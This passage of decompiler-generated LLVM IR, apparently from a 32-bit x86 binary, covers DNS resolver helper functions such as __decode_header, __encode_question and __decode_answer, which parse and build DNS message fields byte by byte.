  %v1_8050380 = add i32 %v0_8050380, 37
  %v2_8050380 = inttoptr i32 %v1_8050380 to i8*
  %v3_8050380 = load i8, i8* %v2_8050380, align 1
  %v2_8050384 = load i32, i32* %esi.global-to-local, align 4
  %v3_8050384 = add i32 %v2_8050384, 6
  %v4_8050384 = inttoptr i32 %v3_8050384 to i8*
  store i8 %v3_8050380, i8* %v4_8050384, align 1
  %v0_8050387 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050387 = add i32 %v0_8050387, 36
  %v2_8050387 = inttoptr i32 %v1_8050387 to i32*
  %v3_8050387 = load i32, i32* %v2_8050387, align 4
  %v1_805038a = trunc i32 %v3_8050387 to i8
  %v2_805038a = load i32, i32* %esi.global-to-local, align 4
  %v3_805038a = add i32 %v2_805038a, 7
  %v4_805038a = inttoptr i32 %v3_805038a to i8*
  store i8 %v1_805038a, i8* %v4_805038a, align 1
  %v0_805038d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805038d = add i32 %v0_805038d, 41
  %v2_805038d = inttoptr i32 %v1_805038d to i8*
  %v3_805038d = load i8, i8* %v2_805038d, align 1
  %v2_8050391 = load i32, i32* %esi.global-to-local, align 4
  %v3_8050391 = add i32 %v2_8050391, 8
  %v4_8050391 = inttoptr i32 %v3_8050391 to i8*
  store i8 %v3_805038d, i8* %v4_8050391, align 1
  %v0_8050394 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050394 = add i32 %v0_8050394, 40
  %v2_8050394 = inttoptr i32 %v1_8050394 to i32*
  %v3_8050394 = load i32, i32* %v2_8050394, align 4
  %v1_8050397 = trunc i32 %v3_8050394 to i8
  %v2_8050397 = load i32, i32* %esi.global-to-local, align 4
  %v3_8050397 = add i32 %v2_8050397, 9
  %v4_8050397 = inttoptr i32 %v3_8050397 to i8*
  store i8 %v1_8050397, i8* %v4_8050397, align 1
  %v0_805039a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805039a = add i32 %v0_805039a, 45
  %v2_805039a = inttoptr i32 %v1_805039a to i8*
  %v3_805039a = load i8, i8* %v2_805039a, align 1
  %v2_805039e = load i32, i32* %esi.global-to-local, align 4
  %v3_805039e = add i32 %v2_805039e, 10
  %v4_805039e = inttoptr i32 %v3_805039e to i8*
  store i8 %v3_805039a, i8* %v4_805039e, align 1
  %v0_80503a1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80503a1 = add i32 %v0_80503a1, 44
  %v2_80503a1 = inttoptr i32 %v1_80503a1 to i32*
  %v3_80503a1 = load i32, i32* %v2_80503a1, align 4
  %v1_80503a4 = trunc i32 %v3_80503a1 to i8
  %v2_80503a4 = load i32, i32* %esi.global-to-local, align 4
  %v3_80503a4 = add i32 %v2_80503a4, 11
  %v4_80503a4 = inttoptr i32 %v3_80503a4 to i8*
  store i8 %v1_80503a4, i8* %v4_80503a4, align 1
  %v2_80503ac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80503ac

dec_label_pc_80503ac:                             ; preds = %entry, %dec_label_pc_8050318
  %v2_80503ac = phi i32 [ %v0_8050304, %entry ], [ %v2_80503ac.pre, %dec_label_pc_8050318 ]
  %v0_80503ae = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_8050318 ]
  store i32 %v2_80503ac, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80503ae

; uselistorder directives
  uselistorder i32 45, { 3, 1, 2, 0 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 2, 1, 0, 3 }
  uselistorder i32 33, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80503ac, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_80503b0 = load i32, i32* @ebx, align 4
  store i32 %v0_80503b0, i32* %stack_var_-4, align 4
  %v4_80503b1 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_80503b1, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_80503b9 = load i8, i8* %tmp2, align 1
  %v3_80503b9 = zext i8 %v2_80503b9 to i32
  %v1_80503bc = add i32 %v4_80503b1, 1
  %v2_80503bc = inttoptr i32 %v1_80503bc to i8*
  %v3_80503bc = load i8, i8* %v2_80503bc, align 1
  %v4_80503bc = zext i8 %v3_80503bc to i32
  %v2_80503c0 = mul nuw nsw i32 %v3_80503b9, 256
  %v2_80503c3 = or i32 %v4_80503bc, %v2_80503c0
  %v2_80503c5 = inttoptr i32 %tmp to i32*
  store i32 %v2_80503c3, i32* %v2_80503c5, align 4
  %v0_80503c7 = load i32, i32* @ecx, align 4
  %v1_80503c7 = add i32 %v0_80503c7, 2
  %v2_80503c7 = inttoptr i32 %v1_80503c7 to i8*
  %v3_80503c7 = load i8, i8* %v2_80503c7, align 1
  %tmp6 = icmp slt i8 %v3_80503c7, 0
  %v2_80503cb = zext i1 %tmp6 to i32
  %v1_80503ce = load i32, i32* %ebx.global-to-local, align 4
  %v2_80503ce = add i32 %v1_80503ce, 4
  %v3_80503ce = inttoptr i32 %v2_80503ce to i32*
  store i32 %v2_80503cb, i32* %v3_80503ce, align 4
  %v0_80503d1 = load i32, i32* @ecx, align 4
  %v1_80503d1 = add i32 %v0_80503d1, 2
  %v2_80503d1 = inttoptr i32 %v1_80503d1 to i8*
  %v3_80503d1 = load i8, i8* %v2_80503d1, align 1
  %v3_80503d4 = udiv i8 %v3_80503d1, 8
  %tmp7 = urem i8 %v3_80503d4, 16
  %v1_80503d7 = zext i8 %tmp7 to i32
  %v1_80503da = load i32, i32* %ebx.global-to-local, align 4
  %v2_80503da = add i32 %v1_80503da, 8
  %v3_80503da = inttoptr i32 %v2_80503da to i32*
  store i32 %v1_80503d7, i32* %v3_80503da, align 4
  %v0_80503dd = load i32, i32* @ecx, align 4
  %v1_80503dd = add i32 %v0_80503dd, 2
  %v2_80503dd = inttoptr i32 %v1_80503dd to i8*
  %v3_80503dd = load i8, i8* %v2_80503dd, align 1
  %div = udiv i8 %v3_80503dd, 4
  %tmp8 = urem i8 %div, 2
  %v1_80503e4 = zext i8 %tmp8 to i32
  %v1_80503e7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80503e7 = add i32 %v1_80503e7, 12
  %v3_80503e7 = inttoptr i32 %v2_80503e7 to i32*
  store i32 %v1_80503e4, i32* %v3_80503e7, align 4
  %v0_80503ea = load i32, i32* @ecx, align 4
  %v1_80503ea = add i32 %v0_80503ea, 2
  %v2_80503ea = inttoptr i32 %v1_80503ea to i8*
  %v3_80503ea = load i8, i8* %v2_80503ea, align 1
  %div5 = udiv i8 %v3_80503ea, 2
  %tmp9 = urem i8 %div5, 2
  %v1_80503f0 = zext i8 %tmp9 to i32
  %v1_80503f3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80503f3 = add i32 %v1_80503f3, 16
  %v3_80503f3 = inttoptr i32 %v2_80503f3 to i32*
  store i32 %v1_80503f0, i32* %v3_80503f3, align 4
  %v0_80503f6 = load i32, i32* @ecx, align 4
  %v1_80503f6 = add i32 %v0_80503f6, 2
  %v2_80503f6 = inttoptr i32 %v1_80503f6 to i8*
  %v3_80503f6 = load i8, i8* %v2_80503f6, align 1
  %tmp10 = urem i8 %v3_80503f6, 2
  %v1_80503fa = zext i8 %tmp10 to i32
  %v1_80503fd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80503fd = add i32 %v1_80503fd, 20
  %v3_80503fd = inttoptr i32 %v2_80503fd to i32*
  store i32 %v1_80503fa, i32* %v3_80503fd, align 4
  %v0_8050400 = load i32, i32* @ecx, align 4
  %v1_8050400 = add i32 %v0_8050400, 3
  %v2_8050400 = inttoptr i32 %v1_8050400 to i8*
  %v3_8050400 = load i8, i8* %v2_8050400, align 1
  %tmp11 = icmp slt i8 %v3_8050400, 0
  %v2_8050404 = zext i1 %tmp11 to i32
  %v1_8050407 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050407 = add i32 %v1_8050407, 24
  %v3_8050407 = inttoptr i32 %v2_8050407 to i32*
  store i32 %v2_8050404, i32* %v3_8050407, align 4
  %v0_805040a = load i32, i32* @ecx, align 4
  %v1_805040a = add i32 %v0_805040a, 3
  %v2_805040a = inttoptr i32 %v1_805040a to i8*
  %v3_805040a = load i8, i8* %v2_805040a, align 1
  %tmp12 = urem i8 %v3_805040a, 16
  %v1_805040e = zext i8 %tmp12 to i32
  %v1_8050411 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050411 = add i32 %v1_8050411, 28
  %v3_8050411 = inttoptr i32 %v2_8050411 to i32*
  store i32 %v1_805040e, i32* %v3_8050411, align 4
  %v0_8050414 = load i32, i32* @ecx, align 4
  %v1_8050414 = add i32 %v0_8050414, 4
  %v2_8050414 = inttoptr i32 %v1_8050414 to i8*
  %v3_8050414 = load i8, i8* %v2_8050414, align 1
  %v4_8050414 = zext i8 %v3_8050414 to i32
  %v1_8050418 = add i32 %v0_8050414, 5
  %v2_8050418 = inttoptr i32 %v1_8050418 to i8*
  %v3_8050418 = load i8, i8* %v2_8050418, align 1
  %v4_8050418 = zext i8 %v3_8050418 to i32
  %v2_805041c = mul nuw nsw i32 %v4_8050414, 256
  %v2_805041f = or i32 %v4_8050418, %v2_805041c
  %v1_8050421 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050421 = add i32 %v1_8050421, 32
  %v3_8050421 = inttoptr i32 %v2_8050421 to i32*
  store i32 %v2_805041f, i32* %v3_8050421, align 4
  %v0_8050424 = load i32, i32* @ecx, align 4
  %v1_8050424 = add i32 %v0_8050424, 6
  %v2_8050424 = inttoptr i32 %v1_8050424 to i8*
  %v3_8050424 = load i8, i8* %v2_8050424, align 1
  %v4_8050424 = zext i8 %v3_8050424 to i32
  %v1_8050428 = add i32 %v0_8050424, 7
  %v2_8050428 = inttoptr i32 %v1_8050428 to i8*
  %v3_8050428 = load i8, i8* %v2_8050428, align 1
  %v4_8050428 = zext i8 %v3_8050428 to i32
  %v2_805042c = mul nuw nsw i32 %v4_8050424, 256
  %v2_805042f = or i32 %v4_8050428, %v2_805042c
  %v1_8050431 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050431 = add i32 %v1_8050431, 36
  %v3_8050431 = inttoptr i32 %v2_8050431 to i32*
  store i32 %v2_805042f, i32* %v3_8050431, align 4
  %v0_8050434 = load i32, i32* @ecx, align 4
  %v1_8050434 = add i32 %v0_8050434, 8
  %v2_8050434 = inttoptr i32 %v1_8050434 to i8*
  %v3_8050434 = load i8, i8* %v2_8050434, align 1
  %v4_8050434 = zext i8 %v3_8050434 to i32
  %v1_8050438 = add i32 %v0_8050434, 9
  %v2_8050438 = inttoptr i32 %v1_8050438 to i8*
  %v3_8050438 = load i8, i8* %v2_8050438, align 1
  %v4_8050438 = zext i8 %v3_8050438 to i32
  %v2_805043c = mul nuw nsw i32 %v4_8050434, 256
  %v2_805043f = or i32 %v4_8050438, %v2_805043c
  %v1_8050441 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050441 = add i32 %v1_8050441, 40
  %v3_8050441 = inttoptr i32 %v2_8050441 to i32*
  store i32 %v2_805043f, i32* %v3_8050441, align 4
  %v0_8050444 = load i32, i32* @ecx, align 4
  %v1_8050444 = add i32 %v0_8050444, 10
  %v2_8050444 = inttoptr i32 %v1_8050444 to i8*
  %v3_8050444 = load i8, i8* %v2_8050444, align 1
  %v4_8050444 = zext i8 %v3_8050444 to i32
  %v1_8050448 = add i32 %v0_8050444, 11
  %v2_8050448 = inttoptr i32 %v1_8050448 to i8*
  %v3_8050448 = load i8, i8* %v2_8050448, align 1
  %v4_8050448 = zext i8 %v3_8050448 to i32
  %v2_805044c = mul nuw nsw i32 %v4_8050444, 256
  %v2_805044f = or i32 %v4_8050448, %v2_805044c
  %v1_8050451 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050451 = add i32 %v1_8050451, 44
  %v3_8050451 = inttoptr i32 %v2_8050451 to i32*
  store i32 %v2_805044f, i32* %v3_8050451, align 4
  %v2_8050459 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050459, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 7, 8, 1, 2, 5, 6, 9, 3, 10, 11, 12, 13, 4, 14, 0 }
  uselistorder i32 40, { 2, 3, 7, 5, 6, 4, 0, 1, 8, 9, 10, 11 }
  uselistorder i32 7, { 7, 8, 2, 4, 5, 3, 0, 1, 6, 9, 10, 11, 12, 13 }
  uselistorder i32 6, { 12, 13, 0, 1, 7, 15, 3, 11, 8, 9, 6, 14, 16, 4, 5, 2, 10 }
  uselistorder i32 28, { 11, 12, 7, 8, 13, 25, 34, 24, 17, 18, 0, 19, 20, 21, 22, 23, 3, 4, 5, 1, 26, 6, 9, 10, 14, 15, 27, 28, 29, 30, 31, 32, 2, 33, 35, 16 }
  uselistorder i8 2, { 1, 2, 3, 4, 5, 17, 6, 0, 18, 16, 7, 8, 9, 10, 11, 12, 14, 15, 13 }
  uselistorder i8 8, { 0, 2, 3, 1, 4, 5, 6 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_805045c = load i32, i32* @edi, align 4
  %v0_805045d = load i32, i32* @esi, align 4
  %v0_805045e = load i32, i32* @ebx, align 4
  store i32 %v0_805045e, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_805046b = load i32, i32* @eax, align 4
  %v1_805046e = inttoptr i32 %tmp to i32*
  %v2_805046e = load i32, i32* %v1_805046e, align 4
  %v7_8050470 = inttoptr i32 %v2_805046e to i8*
  %v8_8050470 = call i32 @__encode_dotted(i8* %v7_8050470, i32 %tmp2, i32 %tmp3, i32 %v0_805046b, i32 %v0_805045e, i32 %v0_805045d, i32 %v0_805045c)
  %v2_8050478 = icmp slt i32 %v8_8050470, 0
  store i32 %v8_8050470, i32* @ecx, align 4
  br i1 %v2_8050478, label %dec_label_pc_80504a9, label %dec_label_pc_805047e

dec_label_pc_805047e:                             ; preds = %entry
  %v0_805047e = load i32, i32* @ebx, align 4
  %v2_805047e = sub i32 %v0_805047e, %v8_8050470
  %v1_8050480 = add i32 %v2_805047e, -3
  %v6_8050480 = sub i32 2, %v2_805047e
  %v7_8050480 = and i32 %v6_8050480, %v2_805047e
  %v8_8050480 = icmp slt i32 %v7_8050480, 0
  %v9_8050480 = icmp eq i32 %v1_8050480, 0
  %v10_8050480 = icmp slt i32 %v1_8050480, 0
  %v3_8050483 = icmp eq i1 %v10_8050480, %v8_8050480
  %v4_8050483 = icmp eq i1 %v9_8050480, false
  %v5_8050483 = and i1 %v4_8050483, %v3_8050483
  br i1 %v5_8050483, label %dec_label_pc_805048a, label %dec_label_pc_8050485

dec_label_pc_8050485:                             ; preds = %dec_label_pc_805047e
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_80504a9

dec_label_pc_805048a:                             ; preds = %dec_label_pc_805047e
  %v0_805048a = load i32, i32* @edi, align 4
  %v2_805048a = add i32 %v0_805048a, %v8_8050470
  store i32 %v2_805048a, i32* @edx, align 4
  %v0_805048d = load i32, i32* @esi, align 4
  %v1_805048d = add i32 %v0_805048d, 5
  %v2_805048d = inttoptr i32 %v1_805048d to i8*
  %v3_805048d = load i8, i8* %v2_805048d, align 1
  %v1_8050491 = add i32 %v8_8050470, 4
  store i32 %v1_8050491, i32* @ecx, align 4
  %v3_8050494 = inttoptr i32 %v2_805048a to i8*
  store i8 %v3_805048d, i8* %v3_8050494, align 1
  %v0_8050496 = load i32, i32* @esi, align 4
  %v1_8050496 = add i32 %v0_8050496, 4
  %v2_8050496 = inttoptr i32 %v1_8050496 to i32*
  %v3_8050496 = load i32, i32* %v2_8050496, align 4
  %v1_8050499 = trunc i32 %v3_8050496 to i8
  %v2_8050499 = load i32, i32* @edx, align 4
  %v3_8050499 = add i32 %v2_8050499, 1
  %v4_8050499 = inttoptr i32 %v3_8050499 to i8*
  store i8 %v1_8050499, i8* %v4_8050499, align 1
  %v0_805049c = load i32, i32* @esi, align 4
  %v1_805049c = add i32 %v0_805049c, 9
  %v2_805049c = inttoptr i32 %v1_805049c to i8*
  %v3_805049c = load i8, i8* %v2_805049c, align 1
  %v2_80504a0 = load i32, i32* @edx, align 4
  %v3_80504a0 = add i32 %v2_80504a0, 2
  %v4_80504a0 = inttoptr i32 %v3_80504a0 to i8*
  store i8 %v3_805049c, i8* %v4_80504a0, align 1
  %v0_80504a3 = load i32, i32* @esi, align 4
  %v1_80504a3 = add i32 %v0_80504a3, 8
  %v2_80504a3 = inttoptr i32 %v1_80504a3 to i32*
  %v3_80504a3 = load i32, i32* %v2_80504a3, align 4
  %v1_80504a6 = trunc i32 %v3_80504a3 to i8
  %v2_80504a6 = load i32, i32* @edx, align 4
  %v3_80504a6 = add i32 %v2_80504a6, 3
  %v4_80504a6 = inttoptr i32 %v3_80504a6 to i8*
  store i8 %v1_80504a6, i8* %v4_80504a6, align 1
  %v0_80504aa.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80504a9

dec_label_pc_80504a9:                             ; preds = %entry, %dec_label_pc_8050485, %dec_label_pc_805048a
  %v0_80504aa = phi i32 [ %v8_8050470, %entry ], [ -1, %dec_label_pc_8050485 ], [ %v0_80504aa.pre, %dec_label_pc_805048a ]
  %v2_80504a9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80504a9, i32* @ebx, align 4
  store i32 %v0_805045c, i32* @edi, align 4
  ret i32 %v0_80504aa

; uselistorder directives
  uselistorder i32 %v1_8050480, { 1, 0 }
  uselistorder i32 %v2_805047e, { 0, 2, 1 }
  uselistorder i32 %v8_8050470, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 -3, { 2, 1, 0, 5, 3, 4 }
  uselistorder label %dec_label_pc_80504a9, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_80504bb = call i32 @__length_dotted(i32 %tmp, i32 %tmp1)
  %v2_80504c0 = icmp slt i32 %v2_80504bb, 0
  %v1_80504c2 = add i32 %v2_80504bb, 4
  %v1_80504c5 = icmp eq i1 %v2_80504c0, false
  %v4_80504c5 = select i1 %v1_80504c5, i32 %v1_80504c2, i32 %v2_80504bb
  ret i32 %v4_80504c5

; uselistorder directives
  uselistorder i32 %v2_80504bb, { 1, 0, 2 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80504cc = load i32, i32* @ebp, align 4
  %v0_80504cd = load i32, i32* @edi, align 4
  %v0_80504ce = load i32, i32* @esi, align 4
  %v0_80504cf = load i32, i32* @ebx, align 4
  store i32 %v0_80504cf, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_80504f0 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80504f0, i32* %eax.global-to-local, align 4
  %v4_80504fd = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_80504f0, i32 256)
  store i32 %v4_80504fd, i32* %eax.global-to-local, align 4
  %v3_8050505 = icmp slt i32 %v4_80504fd, 0
  store i32 %v4_80504fd, i32* @edi, align 4
  br i1 %v3_8050505, label %dec_label_pc_80505b8, label %dec_label_pc_805050f

dec_label_pc_805050f:                             ; preds = %entry
  %v0_805050f = load i32, i32* @ebx, align 4
  %v3_805050f = add i32 %v0_805050f, %v4_80504fd
  %v0_8050511 = load i32, i32* @esi, align 4
  %v2_8050511 = sub i32 %v0_8050511, %v3_805050f
  %v1_8050513 = add i32 %v2_8050511, -10
  %v10_8050513 = icmp slt i32 %v1_8050513, 0
  store i32 %v1_8050513, i32* @esi, align 4
  %v1_805051e = icmp eq i1 %v10_8050513, false
  br i1 %v1_805051e, label %dec_label_pc_8050527, label %dec_label_pc_8050520

dec_label_pc_8050520:                             ; preds = %dec_label_pc_805050f
  br label %dec_label_pc_80505b8

dec_label_pc_8050527:                             ; preds = %dec_label_pc_805050f
  %v6_805052e = add i32 %v3_805050f, %tmp4
  store i32 %v6_805052e, i32* @ebx, align 4
  store i32 %v2_80504f0, i32* %eax.global-to-local, align 4
  %v1_805053a = bitcast i32* %stack_var_-272 to i8*
  %v2_805053a = call i32 @__GI_strdup(i8* %v1_805053a)
  store i32 %v2_805053a, i32* %eax.global-to-local, align 4
  %v0_805053f = load i32, i32* @ebx, align 4
  %v1_805053f = add i32 %v0_805053f, 4
  store i32 %v1_805053f, i32* %esi.global-to-local, align 4
  %v1_8050542 = load i32, i32* @ebp, align 4
  %v2_8050542 = inttoptr i32 %v1_8050542 to i32*
  store i32 %v2_805053a, i32* %v2_8050542, align 4
  %v0_8050545 = load i32, i32* @ebx, align 4
  %v1_8050545 = inttoptr i32 %v0_8050545 to i8*
  %v2_8050545 = load i8, i8* %v1_8050545, align 1
  %v3_8050545 = zext i8 %v2_8050545 to i32
  store i32 %v3_8050545, i32* %eax.global-to-local, align 4
  %v1_8050548 = add i32 %v0_8050545, 1
  %v2_8050548 = inttoptr i32 %v1_8050548 to i8*
  %v3_8050548 = load i8, i8* %v2_8050548, align 1
  %v4_8050548 = zext i8 %v3_8050548 to i32
  store i32 %v4_8050548, i32* %edx.global-to-local, align 4
  %v2_805054c = mul nuw nsw i32 %v3_8050545, 256
  %v2_805054f = or i32 %v4_8050548, %v2_805054c
  store i32 %v2_805054f, i32* %eax.global-to-local, align 4
  %v1_8050551 = load i32, i32* @ebp, align 4
  %v2_8050551 = add i32 %v1_8050551, 4
  %v3_8050551 = inttoptr i32 %v2_8050551 to i32*
  store i32 %v2_805054f, i32* %v3_8050551, align 4
  %v0_8050554 = load i32, i32* @ebx, align 4
  %v1_8050554 = add i32 %v0_8050554, 2
  %v2_8050554 = inttoptr i32 %v1_8050554 to i8*
  %v3_8050554 = load i8, i8* %v2_8050554, align 1
  %v4_8050554 = zext i8 %v3_8050554 to i32
  store i32 %v4_8050554, i32* %eax.global-to-local, align 4
  %v1_8050558 = add i32 %v0_8050554, 3
  %v2_8050558 = inttoptr i32 %v1_8050558 to i8*
  %v3_8050558 = load i8, i8* %v2_8050558, align 1
  %v4_8050558 = zext i8 %v3_8050558 to i32
  store i32 %v4_8050558, i32* %edx.global-to-local, align 4
  %v2_805055c = mul nuw nsw i32 %v4_8050554, 256
  %v2_805055f = or i32 %v4_8050558, %v2_805055c
  store i32 %v2_805055f, i32* %eax.global-to-local, align 4
  %v1_8050561 = load i32, i32* @ebp, align 4
  %v2_8050561 = add i32 %v1_8050561, 8
  %v3_8050561 = inttoptr i32 %v2_8050561 to i32*
  store i32 %v2_805055f, i32* %v3_8050561, align 4
  %v0_8050564 = load i32, i32* @ebx, align 4
  %v1_8050564 = add i32 %v0_8050564, 4
  %v2_8050564 = inttoptr i32 %v1_8050564 to i8*
  %v3_8050564 = load i8, i8* %v2_8050564, align 1
  %v4_8050564 = zext i8 %v3_8050564 to i32
  store i32 %v4_8050564, i32* %edx.global-to-local, align 4
  %v0_8050568 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050568 = add i32 %v0_8050568, 1
  %v2_8050568 = inttoptr i32 %v1_8050568 to i8*
  %v3_8050568 = load i8, i8* %v2_8050568, align 1
  %v4_8050568 = zext i8 %v3_8050568 to i32
  store i32 %v4_8050568, i32* %eax.global-to-local, align 4
  %v1_805056c = add i32 %v0_8050568, 2
  %v2_805056c = inttoptr i32 %v1_805056c to i8*
  %v3_805056c = load i8, i8* %v2_805056c, align 1
  %v4_805056c = zext i8 %v3_805056c to i32
  %v2_8050570 = mul nuw i32 %v4_8050564, 16777216
  %v2_8050573 = mul nuw nsw i32 %v4_8050568, 65536
  store i32 %v2_8050573, i32* %eax.global-to-local, align 4
  %v2_8050576 = or i32 %v2_8050573, %v2_8050570
  store i32 %v2_8050576, i32* %edx.global-to-local, align 4
  %v1_8050578 = add i32 %v0_8050568, 3
  %v2_8050578 = inttoptr i32 %v1_8050578 to i8*
  %v3_8050578 = load i8, i8* %v2_8050578, align 1
  %v4_8050578 = zext i8 %v3_8050578 to i32
  store i32 %v4_8050578, i32* %eax.global-to-local, align 4
  %v2_805057c = mul nuw nsw i32 %v4_805056c, 256
  %v2_805057f = or i32 %v4_8050578, %v2_8050576
  store i32 %v2_805057f, i32* %edx.global-to-local, align 4
  %v2_8050581 = or i32 %v2_805057f, %v2_805057c
  store i32 %v2_8050581, i32* @ecx, align 4
  %v1_8050583 = load i32, i32* @ebp, align 4
  %v2_8050583 = add i32 %v1_8050583, 12
  %v3_8050583 = inttoptr i32 %v2_8050583 to i32*
  store i32 %v2_8050581, i32* %v3_8050583, align 4
  %v0_8050586 = load i32, i32* @ebx, align 4
  %v1_8050586 = add i32 %v0_8050586, 8
  %v2_8050586 = inttoptr i32 %v1_8050586 to i8*
  %v3_8050586 = load i8, i8* %v2_8050586, align 1
  %v4_8050586 = zext i8 %v3_8050586 to i32
  store i32 %v4_8050586, i32* %edx.global-to-local, align 4
  %v1_805058a = add i32 %v0_8050586, 9
  %v2_805058a = inttoptr i32 %v1_805058a to i8*
  %v3_805058a = load i8, i8* %v2_805058a, align 1
  %v4_805058a = zext i8 %v3_805058a to i32
  store i32 %v4_805058a, i32* %eax.global-to-local, align 4
  %v1_805058e = add i32 %v0_8050586, 10
  %v1_8050591 = load i32, i32* @ebp, align 4
  %v2_8050591 = add i32 %v1_8050591, 20
  %v3_8050591 = inttoptr i32 %v2_8050591 to i32*
  store i32 %v1_805058e, i32* %v3_8050591, align 4
  %v0_8050594 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050594 = mul i32 %v0_8050594, 256
  %v1_8050597 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050597 = or i32 %v1_8050597, %v2_8050594
  store i32 %v2_8050597, i32* @edx, align 4
  %v1_8050599 = load i32, i32* @ebp, align 4
  %v2_8050599 = add i32 %v1_8050599, 16
  %v3_8050599 = inttoptr i32 %v2_8050599 to i32*
  store i32 %v2_8050597, i32* %v3_8050599, align 4
  %v1_80505a3 = add i32 %v3_805050f, 10
  store i32 %v1_80505a3, i32* %eax.global-to-local, align 4
  %v1_80505a6 = load i32, i32* @ebp, align 4
  %v2_80505a6 = add i32 %v1_80505a6, 24
  %v3_80505a6 = inttoptr i32 %v2_80505a6 to i32*
  store i32 %v1_80505a3, i32* %v3_80505a6, align 4
  %v4_80505a9 = load i32, i32* @edx, align 4
  %v5_80505ad = icmp slt i32 %v1_8050513, %v4_80505a9
  br i1 %v5_80505ad, label %dec_label_pc_80505af, label %dec_label_pc_80505b4

dec_label_pc_80505af:                             ; preds = %dec_label_pc_8050527
  br label %dec_label_pc_80505b8

dec_label_pc_80505b4:                             ; preds = %dec_label_pc_8050527
  %v1_80505b4 = load i32, i32* @edi, align 4
  %v2_80505b4 = add i32 %v4_80505a9, 10
  %v3_80505b4 = add i32 %v2_80505b4, %v1_80505b4
  br label %dec_label_pc_80505b8

dec_label_pc_80505b8:                             ; preds = %entry, %dec_label_pc_80505af, %dec_label_pc_8050520, %dec_label_pc_80505b4
  %v0_80505be = phi i32 [ %v4_80504fd, %entry ], [ -1, %dec_label_pc_80505af ], [ %v1_8050513, %dec_label_pc_8050520 ], [ %v3_80505b4, %dec_label_pc_80505b4 ]
  store i32 %v0_80505be, i32* %eax.global-to-local, align 4
  %v2_80505c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80505c0, i32* @ebx, align 4
  store i32 %v0_80504ce, i32* @esi, align 4
  store i32 %v0_80504cd, i32* @edi, align 4
  store i32 %v0_80504cc, i32* @ebp, align 4
  ret i32 %v0_80505be

; uselistorder directives
  uselistorder i32 %v0_80505be, { 1, 0 }
  uselistorder i32 %v2_8050573, { 1, 0 }
  uselistorder i32 %v1_8050513, { 0, 1, 3, 2 }
  uselistorder i32 %v3_805050f, { 1, 0, 2 }
  uselistorder i32 %v4_80504fd, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_80504f0, { 1, 0, 2 }
  uselistorder i32 24, { 8, 9, 15, 0, 10, 11, 12, 16, 2, 3, 7, 4, 5, 6, 13, 17, 18, 19, 20, 21, 22, 23, 24, 1, 14 }
  uselistorder i32 20, { 11, 12, 13, 14, 1, 20, 18, 3, 19, 15, 16, 2, 21, 22, 0, 5, 6, 8, 7, 9, 10, 23, 24, 25, 26, 27, 4, 28, 29, 30, 17 }
  uselistorder i32 9, { 9, 10, 11, 12, 3, 13, 14, 15, 1, 8, 0, 4, 16, 17, 18, 19, 5, 6, 7, 2 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 3, { 35, 36, 37, 38, 39, 40, 21, 0, 12, 1, 22, 2, 16, 43, 3, 41, 23, 5, 4, 6, 9, 10, 8, 24, 13, 25, 33, 19, 7, 34, 26, 27, 28, 29, 30, 31, 42, 17, 18, 32, 14, 15, 11, 20 }
  uselistorder i32 -10, { 1, 0 }
